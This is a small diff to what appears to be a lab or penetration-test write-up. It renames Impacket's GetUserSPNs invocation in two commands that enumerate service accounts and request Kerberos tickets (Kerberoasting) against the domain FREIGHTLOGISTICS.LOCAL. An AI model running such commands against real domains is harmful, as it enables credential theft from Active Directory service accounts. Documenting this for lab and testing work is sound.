@@ -7,11 +7,11 @@
 > Terminal output is omitted; only commands & scripts are captured.
 
 ```bash
-GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL {{DOMAIN_UPPER}}/wley
+impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL {{DOMAIN_UPPER}}/wley
 ```
 
 ```bash
-GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL {{DOMAIN_UPPER}}/wley  
+impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL {{DOMAIN_UPPER}}/wley  
 ```
 
 ```bash
